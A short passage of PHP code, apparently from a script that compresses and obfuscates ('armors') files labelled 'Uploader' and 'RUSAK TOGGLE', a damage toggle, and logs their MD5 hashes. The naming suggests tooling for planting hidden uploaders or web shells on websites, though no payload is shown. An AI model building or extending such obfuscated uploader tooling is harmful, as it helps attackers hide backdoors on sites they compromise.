        if ($arm === false) { $log[] = '[x] GAGAL armor ' . $tn . ' (zlib/gzdeflate tidak tersedia)'; continue; }
        $mark = ($tn === 'rusak_toggle.php') ? 'RUSAK TOGGLE' : 'Uploader';
        $m5 = md5($arm);
